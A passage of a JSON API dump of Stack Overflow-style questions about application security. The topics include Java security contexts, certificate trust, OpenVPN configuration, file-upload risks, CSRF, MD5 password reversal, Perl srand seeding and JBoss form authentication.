returned by <code>AccessController.getContext()</code>?</p>\n\n<p><strong>Update</strong></p>\n\n<p>Just to clarify, I know how to mock interfaces.  AccessController is a Java security feature.  I'm having trouble finding out how to set my own context so that when a method calls <code>AccessController.getContext()</code> it returns a AccessControlContext of my choosing.</p>\n"},{"tags":["java","security","jsf","ejb","cdi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13015504,"title":"CDI and EJB, security issues?","body":"<p>I am reviewing my code from since I picked up on JSF.\nOne of the most complex issues has come up once again. The decision between CDI and EJB.</p>\n\n<p>I am using three layers and I wonder which type of annotation to use on each of them:\n- Backing beans (the Controller as defined in MVC)\n- The service layer\n- DAO's</p>\n\n<p>My backing beans are using CDI, as long as I don't need anything from EJB.\nBut I am stuck on those other two. I remember reading about using EJB beans because of the pooling functionalities, which would prevent massive loads of requests (or attacks, if you will).\nSo in short, is there ANY reason to use EJB (Stateless, Stateful, LocalBean et cetera), considering security or anything else (excluded ViewScoped)?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["javascript","security","iframe","third-party"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":385,"score":3,"question_id":5816166,"title":"When allowing users to embed content from another website are iframes better?","body":"<p>When allowing users to embed content from another website are iframes better than using let's say a javascript document.write to put the content on the page?</p>\n\n<p>What I have is a social networking website in development, and I want to allow users to embed their profiles into their web pages with a snipet of code.</p>\n\n<p>My concern is that if the code generates an iframe they could reference the iframe and execute functions/code in it. However if I use javascript and it just generates a document.write functions that displays that same information, would that not be better and more secure?</p>\n\n<p>I've seen some people argue that iframes are more secure and fit for embeding third party content (which is what I would be) on websites. Then I see other posts saying that iframe security is vague and unsure if it's a risk or not.</p>\n"},{"tags":["security","deployment","ssh","capistrano"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12981217,"title":"How to restrict user access to only deployments via Capistrano? (deployment workflow issue)","body":"<p>I look for good practices for deploying with capistrano.</p>\n\n<p>I would like to start out with a short description how I used to do deployment.</p>\n\n<p>capistrano is installed locally on a developer's computer. I deploy thought gateway with capistrano option <code>:gateway</code>. Firstly, I thought that with <code>:gateway</code> option I need to have ssh connection only to gateway host, but it turns out that I need ssh connection (<em>public key</em>) to all hosts where I want to deploy to. </p>\n\n<p>I would like to find a convenient and secure way to deploy application.</p>\n\n<p>For example, in case when new developer starts working, is much more convinient to put his *public_key* only on gateway server and not on all applications servers. On the other hand I don't want him to have any connection to servers in particular <em>ssh</em> to gateway, just because he is developer, he needs to do only deployments.</p>\n\n<p>If you are aware of good practices for deploying with capistrano, please, let me know.</p>\n"},{"tags":["java","security","certificate"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":63,"score":3,"question_id":12974770,"title":"Automatically run java applications with trusted certificates","body":"<p>I know there is a way to inject trusted certificates into the java runtime <a href=\"http://docs.oracle.com/javase/tutorial/security/toolsign/rstep2.html\" rel=\"nofollow\">like this</a>, but when a user starts an application using this certificate, he still gets a window much like this</p>\n\n<p><img src=\"http://i.stack.imgur.com/LviZI.png\" alt=\"The application's digital signature has been verified. Do you want to run the application?\"></p>\n\n<p>When accepting, the certificate is visible in the java control panel.</p>\n\n<p>How can I get the certificate in there without the user needing to accept that warning? I want him to run the application without any obstacles when doing so, meaning the certificate is already trusted AND the application can be run immediately.</p>\n"},{"tags":["wordpress","security","plugins","hook"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13012115,"title":"wordpress-liked plugins syystem","body":"<p>I want to build a wordpress-liked cms system with plugins, but I wonder how wordpress manage security issues on his web free hosting platform. I mean for example if a developer writes a plugin that performs deletion in the file system. </p>\n\n<p>Is it possible to restrict the scope of a plugin for security purpose?</p>\n\n<p>What should I take into account when building such system?</p>\n"},{"tags":["c#","security"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":153,"score":6,"question_id":13009944,"title":"Disassembling C#","body":"<p>I've got a question regarding C#.</p>\n\n<p>I am currently working on a medical software product, and one of the important things is to make sure that the patient's data is encrypted.  I got two questions regarding this:</p>\n\n<p>1.) How secure is the Microsoft .NET implementation of AES (Rijndael) from System.Security.Cryptography? Does it have any known security flaws, or am I fine just using the MS implementation? (note, I know the basic background of how these algorithms work, but I am not really that deep into it to get an idea of how it works).</p>\n\n<p>2.) Since the data is stored on the same PC as the application, how hard is it to get information from a C# application? Assuming I have somewhere in the code</p>\n\n<pre><code>string encrypPassword = \"ThisIsMyPassword\";\nstring encryptedString = EncryptString(ClearString, encrypPassword);\n// save encryptedString to harddrive\n</code></pre>\n\n<p>I know that an attacker could just go down to the assemble code, and at that point there is nothing at all I can do against this (the system has to be able to encrypt / decrypt the data), but is there like a shortcut for C# to get the encrypPassword, since it is managed, or does something like this still require you to go down to the assemble code?</p>\n"},{"tags":["java","security","hacking","penetration-testing"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":66,"score":0,"question_id":12661567,"title":"pentesting java applet","body":"<p>Does anyone have an idea about how to pentest a java applet. I mean if there is a website that is written in php .. we try to pentest the site against sql injection, XSS and CSRF, but how can I pentest a java applet..and what are kind of vulnerabilities I might found.. buffer overflow !! ? or .... For example, let's assume I have a java file called room.jnlp that opens a chat room .. I tried to change my profile name to</p>\n\n<p><code>&lt;h1&gt;Profile name&lt;/h1&gt;</code> </p>\n\n<p>but I was sure that the h1 tags will not be executed because it is not a webserver. I also was trying to enter a very long string in the profile name hoping to find a buffer overflow but I was sure this is not gonna happen .. because java checks the boundaries of its arrays</p>\n\n<p>I also would be grateful if you could provide me with online tutorials or some books that talk about how to pentest java application, applets and servlets. \nThank you :) </p>\n"},{"tags":["security","openvpn","network-security"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":9,"score":2,"question_id":13010081,"title":"OpenVPN bad source address from client","body":"<p>I have one problem with OpenVPN.\nThere are a lot drops records in the openvpn log file on the server:</p>\n\n<p><em>Mon Oct 22 10:14:41 2012 us=726541 laptop/:1194 MULTI: bad source address from client [192.168.1.107], packet dropped</em></p>\n\n<pre><code>grep -E \"^[a-z]\" server.conf  \n-----\nport 1194  \nproto udp\ndev tun \nca data/ca.crt \ncert data/server.crt\nkey data/server.key \ndh data/dh1024.pem \ntls-server\ntls-auth data/ta.key 0\nremote-cert-tls client \ncipher AES-256-CBC\ntun-mtu 1200\nserver 10.10.10.0 255.255.255.0 \nifconfig-pool-persist ipp.txt\npush \"redirect-gateway def1 bypass-dhcp\"\npush \"dhcp-option DNS 8.8.8.8\"\nclient-to-client\nclient-config-dir /etc/openvpn/ccd\nroute 10.10.10.0 255.255.255.0\nkeepalive 10 120\ncomp-lzo\npersist-key\npersist-tun\nmax-clients 5\nstatus /var/log/status-openvpn.log\nlog  /var/log/openvpn.log\nverb 4\nauth-user-pass-verify /etc/openvpn/verify.sh via-file\ntmp-dir /tmp\nscript-security 2\n-----\n\ncat ccd/laptop\n-----\niroute 10.10.10.0 255.255.255.0\n-----\n\ncat client.conf \n-----\nremote server ip 1194\nclient\ndev tun\nping 10\n\ncomp-lzo\nproto udp\ntls-client\ntls-auth data/ta.key 1\npkcs12 data/vpn.laptop.p12\n\nremote-cert-tls server\n#ns-cert-type server\npersist-key\npersist-tun\ncipher AES-256-CBC\n\nverb 3\npull\n\nauth-user-pass /home/user/.openvpn/users.db \n-----\n</code></pre>\n\n<p>According to \"Jan Just Keijser - OpenVPN 2 Cookbook\" root of the problem is incorrect config options.</p>\n\n<p>See the screenshot\n<img src=\"http://i.stack.imgur.com/4vPwN.png\" alt=\"See the screenshot\"></p>\n\n<p><strong>But, as you see, my config has such options.\nCould you please help me to solve this problem.</strong></p>\n"},{"tags":["html5","security","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13008962,"title":"html5 direct file uploads security risk?","body":"<p>I'm using html5 canvas based image uploads with base64 encoding (default). server-side: when a request is posted base64 headers are removed and base64_decode function (eval php function is not used at all) is applied and saved as jpg directly onto filesystem. </p>\n\n<p>Since i'm saving uploaded file as an exact copy of what is uploaded. if a user uploads a malicious php/js file masqueraded as jpg and a visitor views that bad jpg is this a security risk? if yes I'll process uploaded file with gd. after gd-processed i assume those will be gone.</p>\n"},{"tags":["wcf","security","certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13006889,"title":"Use a Self-Signed Certificate in production for a WCF service hosted in IIS?","body":"<p>I have a project consisting of a website (ASP.NET WebForms) and a desktop application (WinForms + WPF). Right now I'm designing a WCF Service to be hosted in IIS, that will be consumed by these applications. Service is authenticated by an Active Directory. Unfortunatelly in WCF all security related stuff needs a certificate to work. </p>\n\n<p>On the development machine I know I can use a temporary certificate, but the problem is with production. The client server is accessible only from the intranet, so there is no SSL configured and no certificate (and it's not an option to buy one). </p>\n\n<p><em>My question is: can I use a IIS Self-Signed Certificate on production?</em> What are the disadventages of this? Until now I have used WCF only for simple AJAX calls, and haven't played with the security stuff and certificates. </p>\n"}]}
{"total":17772,"page":6,"pagesize":100,"questions":[{"tags":["c#",".net","asp.net","security","random"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3129,"score":3,"question_id":4892588,"title":"RNGCryptoServiceProvider - Random Number Review","body":"<p><strong>While looking for best attempts at generating truly random numbers, I stumbled upon this code example.</strong> </p>\n\n<p>Looking for opinions on this snippet.</p>\n\n<pre><code>using System;\nusing System.Security.Cryptography;\n\nprivate static int NextInt(int min, int max)\n{\n    RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();\n    byte[] buffer = new byte[4];\n\n    rng.GetBytes(buffer);\n    int result = BitConverter.ToInt32(buffer, 0);\n\n    return new Random(result).Next(min, max);\n}\n</code></pre>\n\n<p>Source: <a href=\"http://www.vcskicks.com/code-snippet/rng-int.php\" rel=\"nofollow\">http://www.vcskicks.com/code-snippet/rng-int.php</a></p>\n\n<p>Would this be preferred over using a tick count seed such as:</p>\n\n<pre><code>Random rand = new Random(Environment.TickCount); \nrand.Next(min, max);\n</code></pre>\n\n<p><strong>Note:</strong></p>\n\n<p><em>I am not looking for third party random data providers such as <a href=\"http://Random.org\" rel=\"nofollow\">Random.org</a>, as such a dependency is not realistic to the application.</em></p>\n"},{"tags":["database","security","internet","firebird","tunnel"],"answer_count":0,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":138,"score":7,"question_id":13007505,"title":"Best method to secure connection to firebird over internet","body":"<p>I have a client-server application which use a firebird server 2.5 over internet.\nI have met the problem of given a secure access to FB databases and as a first approch a tried to solve this problem by integrating a tunnel solution in the application (STunnel software more exactly). BUT, this approch suffer from many aspects :\n- this add more resource consumption (CPU, memory, threads) at both client/server side,\n- sotware deployment become a serious problem because STunnel software is writen as a WinNT Service, not a Dll or a Component (WinNT Service need administrator privileges for install)\nand my client application need to run without installation !</p>\n\n<p>SO, i decided to take the bull by the horn (or the bird by the feathers as we talk about Firebird). I have downloaded the Firebird 2.5 source code and injected secure tunnelization code directly in his low level communication layer (the INET socket layer).\nNOW, encryption/decryption is done directly by the firebird engine for each TCP/IP packet.</p>\n\n<p>What do you think about this approach vs external tunnelization ?</p>\n"},{"tags":["security","nginx"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":3,"view_count":2116,"score":2,"question_id":962230,"title":"Hide X-Powered-By (nginx)","body":"<p>So is there any way to hide X-Powered-By on Nginx?</p>\n"},{"tags":["php","security","file-upload"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":61,"score":0,"question_id":13002692,"title":"Security issues from uploading files to the system","body":"<p>I understand that security issues usually come from user inputs which is why I am assuming there is a security hole in the else part of $eFlag!=1.<br>\nI am not familiar with php so I am not 100% sure what is going on here. </p>\n\n<p>I am assuming that file itself that is being uploaded could be some malicious executable and that is not being checked???\nIf so, is there ways to prevent uploading executable or just upload .doc files (looks like that's the file that the program wants)?</p>\n\n<p>***This was posted on one of the clubs that I am in for school and asked to identify a security hole (in another words, there is one for sure). </p>\n\n<p><img src=\"http://i.stack.imgur.com/hyACU.png\" alt=\"\"></p>\n"},{"tags":["java","security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13005319,"title":"managing certificate trust list with java source code","body":"<p>I am a new learner of java and I am testing Public Key Infrastructure with Java.</p>\n\n<p>And i have been searching for weeks, to manipulate certificate trust list with java source code. But i can't find the solution anywhere.</p>\n\n<p>Certificate Trust List (CTL) is a file extension with (.stl), which contain a list of Trusted Root Certification Authority.</p>\n\n<p>If anyone know how to manage certificate trust list in java, please share me.\nWith Regards,</p>\n"},{"tags":["security","web-security","csrf","csrf-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12739556,"title":"Do we need CSRF protection for public URLs","body":"<p>I have a web app, that does not have any forms (Disabled all form requests in web server).\nIt has only few public URLs ( with some GET params in URL). There is not login and it does not use any cookies.</p>\n\n<p>Do I need CSRF protection for this web app?</p>\n"},{"tags":["security","browser","autocomplete","passwords"],"answer_count":17,"favorite_count":33,"up_vote_count":107,"down_vote_count":1,"view_count":31569,"score":106,"question_id":32369,"title":"Disable browser 'Save Password' functionality","body":"<p>One of the joys of working for a government healthcare agency is having to deal with all of the paranoia around dealing with PHI (Protected Health Information). Don't get me wrong, I'm all for doing everything possible to protect people's personal information (health, financial, surfing habits, etc.), but sometimes people get a little too jumpy.</p>\n\n<p>Case in point: One of our state customers recently found out that the browser provides the handy feature to save your password. We all know that it has been there for a while and is completely optional and is up to the end user to decide whether or not it is a smart decision to use or not. However, there is a bit of an uproar at the moment and we are being demanded to find a way to disable that functionality for our site.</p>\n\n<p><strong>Question</strong>: Is there a way for a site to tell the browser not to offer to remember passwords? I've been around web development a long time but don't know that I have come across that before.</p>\n\n<p>Any help is appreciated.</p>\n\n<p>Thanks,\nMatt</p>\n"},{"tags":["iphone","security","ipad","ipod","jailbreak"],"answer_count":7,"favorite_count":37,"up_vote_count":23,"down_vote_count":0,"view_count":19151,"score":23,"question_id":5011774,"title":"Lock-down iPhone/iPod/iPad so it can only run one app","body":"<p>We'd like to 'lock-down' an iPhone/iPod/iPad so that the user can only run one app (we've developed this app internally). I'm guessing we'd be looking at jailbreaking, and then replacing (?) the default Springboard app... </p>\n\n<p>Can we do this? If so, how?</p>\n\n<p><strong>EDIT</strong> <em>Rick posted a great answer below. You can download a copy of a mobileconfig file from the URL below, if you visit this URL on your iOS device Safari will prompt you to install the profile. Don't forget to reboot your device :)</em></p>\n\n<p><a href=\"http://ipadhire.co.nz/res/lockdown.mobileconfig\" rel=\"nofollow\">http://ipadhire.co.nz/res/lockdown.mobileconfig</a></p>\n\n<p><strong>EDIT EDIT</strong> brainray posted below and pointed out that there's a new feature in iOS 6 called 'guided access' that allows you to lock a device to a specific app. It's a pity this feature wasn't available a year ago -- would have saved us a bit of hassle :)</p>\n"},{"tags":["mysql","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13002027,"title":"Security issues of not checking data type","body":"<p><img src=\"http://i48.tinypic.com/2dhei4j.png\" alt=\"\"></p>\n\n<p>It doesnt check for password type. Password may be defined as 4-digit unsigned ints and if a user attempts to change his/her password to something other than 4-digit unsigned ints, then it may cause errors, correct?</p>\n\n<p>If so, what kind of errors? \njust a simple error message or can this be a major security issue?\nCan someone buffer overflow attack on this?</p>\n"},{"tags":["c#","asp.net-mvc","security","asp.net-mvc-4","forms-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":13000770,"title":"forms authentication in mvc app, authenticating with external service","body":"<p>I am currently working on an MVC4 application where different types of users can visit the site and log in. There will be 2 different categorizations of users, type A and B where can access different areas of the site.</p>\n\n<p>Authentication of the user is via service call to an authentication provider and they will return a status of whether the user have been authenticated or not and the users information eg name, address etc. At this point I would like to track that the user is authenticated and what role they are in. Previously I would have created a cookie with the users name, address etc and stored on the clients machine. But this was open to manipulation as the cookies were plain text.</p>\n\n<p>But I would like to strengthen the security of the site and therefore looking at using FormsAuthentication. I am aware that generates a cookie but it is much more secure. </p>\n\n<p>Is this the correct approach and can the users information such as address etc be stored in this cookie? Session where I would like to store it is not available to me. How would I achieve this with FormsAuthentication?</p>\n\n<p>My second question is, once a user is logged in, how do I know the role that they are in?</p>\n\n<p>Finally, once a user is logged in, should the entire site by https? Even areas that are open to everyone but being visited by the logged in user? The logged in user will have information displayed on screen from them on every page eg Welcome John.</p>\n"},{"tags":["security","bluetooth","rfid","digital","drawer"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":41,"score":0,"question_id":12998586,"title":"small digital lock system - RFID WiFi or Bluetooth","body":"<p>Small Digital lock with RFID or Bluetooth activating system...</p>\n\n<p>Has someone worked with similar technologies in terms of hardware and software?</p>\n\n<p>Any idea will be very appreciated...</p>\n\n<p>Thanks</p>\n"},{"tags":["security","md5","reverse-engineering"],"answer_count":16,"favorite_count":8,"up_vote_count":27,"down_vote_count":2,"view_count":13935,"score":25,"question_id":1471654,"title":"Reversing an MD5 Hash","body":"<p>I have passwords stored in a database using <code>md5</code>, and was wondering if there was a way to reverse the hash to email the user's password to him in case they forget it.</p>\n\n<p>If that's not the most appropriate method, what is the appropriate method for dealing with a lost password?</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":265,"score":0,"question_id":6018270,"title":"prevent builtwith.com showing what my site is built with","body":"<p>Is there a way to mask my real server technology say from PHP to show up as Python when checked by sites like <a href=\"http://builtwith.com\" rel=\"nofollow\">http://builtwith.com</a>? Or at least to not show anything at all?</p>\n"},{"tags":["javascript","security","api","encryption","ssl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12993986,"title":"Javascript Client Authentication (with SSL, without OAuth2)?","body":"<p>The scenario is:</p>\n\n<p>I have a web API, which is being accessed by two clients:</p>\n\n<ul>\n<li>Web App written in Javascript, which is minified</li>\n<li>iOS App</li>\n</ul>\n\n<p>SSL is all set up on the server hosting the API, and it works fine. There is no User Auth for the API because it's a sort of location-based searching app.</p>\n\n<p>I want to ensure though that only the web app and the iPhone client are able to actually make requests to the API. For the iPhone client it's easy - a shared secret between the server and the app will do, and it's encrypted with SSL so we're not worried about people spying on it.</p>\n\n<p>But for the web app the same solution won't work. I can't just leave a string in the code, and even if it's encrypted in there that's all somebody would need.</p>\n\n<p>Basically, I'm looking for a good solution to this problem. I just want to make sure it's kept only to clients who are allowed to use it, but I'm not sure how I can without going and implementing OAuth which I think is probably overkill. Any ideas?</p>\n\n<p>Thanks!\nDan</p>\n"},{"tags":[".net","security","internet-explorer","exe"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":881,"score":2,"question_id":3579930,"title":"Force File Download prompt in IE for .NET executable?","body":"<p>We have a .NET executable that we are hosting on a web server.  The domain for the web server is set as a \"Trusted Site\" on the user's IE.</p>\n\n<p>When the user left clicks the link for the executable, it blows up with the error: \"Microsoft IE Execute shell has encountered a problem and needs to close\".  From what I have read, it is because IE is trying to execute the file directly using ieexec.exe.</p>\n\n<p>What is desired, is the user should get a pop-up box with a security warning asking them if they want to download the .exe, and buttons \"Run\" \"Save\" \"Cancel\".  Not a cryptic security exception. The workaround is to right-click and click on \"Save Target As..\". </p>\n\n<p>Of course, this only blows up in IE, not Firefox or Chrome.</p>\n\n<p>How can I compile the .NET executable to bypass this ieexec.exe and force the file download prompt?</p>\n"},{"tags":["jquery","asp.net-mvc","security","architecture"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":8277818,"title":"widget development","body":"<p>i develop a asp.net mvc3 shop application which is multi tenant. Each customer (around 1000 sites) has a own website where he likes to embed this solution. I use a extended validation SSL as this increases customer thrust.</p>\n\n<p>so far i use iframes, which is not a good choice as on the payment step the customer does not see that the connection is SSL encrypted. so i choosed to put the page complete behind ssl and the page of the customer is ssl too. this is a unsatisfying approach, as i have problems with scrollbars, positioning of lightboxes etc. </p>\n\n<p>my new approach would use asp.net mvc3 to provide controllers which deliver json results; on the client side i want to use a jquery based mvc framework together with jquery templates.</p>\n\n<p>my question is, how should i handle SSL to let the customer see the traffic is encrypted? I want to avoid that customers need to create a proxy and route the traffic through their ssl certificate as many different CMS systems are involved so i can't provide a simple \"how-to\" to the customer.</p>\n"},{"tags":["xml","security","axis2","rampart"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1141,"score":2,"question_id":4609669,"title":"\"Missing wsse:Security header in request\" when I try posting a SOAP message with Axis2 and Rampart","body":"<p>I feel like I've been looking at this issue forever.\nBackground:\nI have to call a secured third party web service.  The body and a header block both need to be signed with a client certificate.\nIf I disable Rampart and use tcpmon and capture the outgoing envelope, I can configure SOAPUI to send the message (by configuring SOAPUI to use the cert to sign the important parts discussed earlier).  That tells me the message isn't the issue.</p>\n\n<p>If I enable Rampart and capture the outgoing message, it looks correct (the two elements are signed, the security elements are all in place).</p>\n\n<p>I get the following stack when I try calling the service with Rampart:</p>\n\n<p>org.apache.axis2.AxisFault: Missing wsse:Security header in request\n    at org.apache.rampart.handler.RampartReceiver.setFaultCodeAndThrowAxisFault(RampartReceiver.java:166)\n    at org.apache.rampart.handler.RampartReceiver.invoke(RampartReceiver.java:99)\n    at org.apache.axis2.engine.Phase.invoke(Phase.java:318)\n    at org.apache.axis2.engine.AxisEngine.invoke(AxisEngine.java:254)\n    at org.apache.axis2.engine.AxisEngine.receive(AxisEngine.java:160)\n    at org.apache.axis2.description.OutInAxisOperationClient.handleResponse(OutInAxisOperation.java:364)\n    at org.apache.axis2.description.OutInAxisOperationClient.send(OutInAxisOperation.java:417)\n    at org.apache.axis2.description.OutInAxisOperationClient.executeImpl(OutInAxisOperation.java:229)\n    at org.apache.axis2.client.OperationClient.execute(OperationClient.java:165)\n    at org.apache.axis2.axis2userguide.RetrieveCurrentBidResults_v20090801ServiceStub.retrieveCurrentBidResults_v20090801(RetrieveCurrentBidResults_v20090801ServiceStub.java:225)\n    at org.transalta.weezer.soap.client.RetrieveCleanBidsClient.main(RetrieveCleanBidsClient.java:64)</p>\n\n<p>and here is the policy.xml file I'm using:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;wsp:Policy wsu:Id=\"SigEncr\"\nxmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\"\nxmlns:wsp=\"http://schemas.xmlsoap.org/ws/2004/09/policy\"&gt;\n&lt;wsp:ExactlyOne&gt;\n    &lt;wsp:All&gt;\n        &lt;sp:AsymmetricBinding\n            xmlns:sp=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy\"&gt;\n            &lt;wsp:Policy&gt;\n                &lt;sp:InitiatorToken&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:X509Token\n                            sp:IncludeToken=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy/IncludeToken/AlwaysToRecipient\"&gt;\n                            &lt;wsp:Policy&gt;\n                                &lt;sp:RequireThumbprintReference /&gt;\n                                &lt;sp:WssX509V1Token10 /&gt;\n                            &lt;/wsp:Policy&gt;\n                        &lt;/sp:X509Token&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:InitiatorToken&gt;\n                &lt;sp:RecipientToken&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:X509Token\n                            sp:IncludeToken=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy/IncludeToken/Never\"&gt;\n                            &lt;wsp:Policy&gt;\n                                &lt;sp:RequireThumbprintReference /&gt;\n                                &lt;sp:WssX509V3Token10 /&gt;\n                            &lt;/wsp:Policy&gt;\n                        &lt;/sp:X509Token&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:RecipientToken&gt;\n                &lt;sp:AlgorithmSuite&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:TripleDesRsa15 /&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:AlgorithmSuite&gt;\n                &lt;sp:Layout&gt;\n                    &lt;wsp:Policy&gt;\n                        &lt;sp:Strict /&gt;\n                    &lt;/wsp:Policy&gt;\n                &lt;/sp:Layout&gt;\n                &lt;sp:OnlySignEntireHeadersAndBody /&gt;\n            &lt;/wsp:Policy&gt;\n        &lt;/sp:AsymmetricBinding&gt;\n        &lt;sp:Wss10 xmlns:sp=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy\"&gt;\n            &lt;wsp:Policy&gt;\n                &lt;sp:MustSupportRefKeyIdentifier /&gt;\n                &lt;sp:MustSupportRefIssuerSerial /&gt;\n            &lt;/wsp:Policy&gt;\n        &lt;/sp:Wss10&gt;\n        &lt;sp:SignedParts xmlns:sp=\"http://schemas.xmlsoap.org/ws/2005/07/securitypolicy\"&gt;\n            &lt;sp:Body /&gt;\n            &lt;sp:Header Name=\"CAISOWSHeader\" Namespace=\"http://www.caiso.com/soa/2006-09-30/CAISOWSHeader.xsd\" /&gt;\n        &lt;/sp:SignedParts&gt;\n    &lt;/wsp:All&gt;\n&lt;/wsp:ExactlyOne&gt;\n&lt;/wsp:Policy&gt;\n</code></pre>\n\n<p>So what I want to know is what the heck is Rampart trying to tell me?  I know the component it doesn't think is present IS there.</p>\n"},{"tags":["perl","security","random","reverse-engineering","srand"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":176,"score":5,"question_id":12497045,"title":"What are the weaknesses of Perl's srand() default seed, post version 5.004?","body":"<p>I can find plenty of documentation as to issues with use of <code>time()</code> prior to Perl version 5.004, but nothing following.</p>\n\n<p>For a homework assignment, we are asked to reverse-engineer a program's results based on the assumption that the default Perl <code>srand()</code> is still flawed in default seeding. The <a href=\"http://perldoc.perl.org/perl5004delta.html#New-and-changed-builtin-functions\">changelog for the perl 5.004 release</a> states that the <code>srand()</code> default seed is now based on \"a heavy mix of difficult-to-predict system-dependent values.\"</p>\n\n<p>Is that the case, and, if so, what are those values and do they have any inherent weaknesses?</p>\n"},{"tags":["asp.net","asp.net-mvc","security","reflection","permissions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12972937,"title":"Assign custom class permissions check for controller actions in ASP.NET MVC4","body":"<p>I have an ASP.NET MVC4 site with custom user/role provider. Entity Framework works with the user and role entities at the bottom level. Now I am introducing a concept of <code>RolePermission</code>s. Each role has an asscocialted list of permissions that allow users in this role to perform certain actions within the system, like deleting comments for example. </p>\n\n<p>In my custom-build admin panel I want to list all the actions of a controllers and have an ability to allow or disallow the call to some action based on the presenace of a permission in the curent user's role.</p>\n\n<p>Questions are:</p>\n\n<ol>\n<li>Is it possible?</li>\n<li>How do I list a set of actions in the controller.</li>\n<li>How do I assign or cancel an association between action and a role permission.</li>\n</ol>\n\n<p>Possible starategy:</p>\n\n<p>I introduce a global custom filter that is applied to all of the controllers and actions, that checks my database to see If I have a logical association. This way a checking code is ran every time the user makes a call to an action. Still how do I list controllers and actions (via reflection perhaps?)</p>\n"},{"tags":["facebook","security","web-applications","secure-coding"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12990448,"title":"Facebook image URLs - how are they kept from un-authorised users?","body":"<p>I'm interested in social networks and have stumbled upon something which makes me curious.</p>\n\n<p>How does facebook keep people from playing with URLs and gaining access to photos they should not?</p>\n\n<p>Let me expand, here's an altered example of a facebook image URL that came up on my feed-</p>\n\n<p><a href=\"https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-prn1/s480x480/\" rel=\"nofollow\">https://fbcdn-sphotos-g-a.akamaihd.net/hphotos-ak-prn1/s480x480/</a>{five_digit_number}_{twelve_digit_number}_{ten_digit_number}_n.jpg</p>\n\n<p>So, those with more web application experience will presumably know the answer to this, I suspect it's well understood, but what is to stop me from changing the numbers and seeing other people's photos that possibly I'm not supposed to?</p>\n\n<p>[I understand that this doesn't work, I'm just trying to understand how they maintain security and avoid this problem]</p>\n\n<p>Many thanks in advance,</p>\n\n<p>Nick</p>\n"},{"tags":["java","security","authentication","web-applications","jboss7.x"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":73,"score":-1,"question_id":12962653,"title":"403 after successful form authentication","body":"<p>I'm using form based authentication in a webapp on JBoss 7, backed by an LdapLoginModule.</p>\n\n<pre><code>&lt;security-constraint&gt;\n    &lt;web-resource-collection&gt;\n        &lt;web-resource-name&gt;Protected Resources&lt;/web-resource-name&gt;\n        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n    &lt;/web-resource-collection&gt;\n    &lt;auth-constraint&gt;\n        &lt;role-name&gt;*&lt;/role-name&gt;\n    &lt;/auth-constraint&gt;\n    &lt;user-data-constraint&gt;\n        &lt;transport-guarantee&gt;NONE&lt;/transport-guarantee&gt;\n    &lt;/user-data-constraint&gt;\n&lt;/security-constraint&gt;\n&lt;login-config&gt;\n    &lt;auth-method&gt;FORM&lt;/auth-method&gt;\n    &lt;realm-name&gt;ldap&lt;/realm-name&gt;\n    &lt;form-login-config&gt;\n        &lt;form-login-page&gt;login.html&lt;/form-login-page&gt;\n        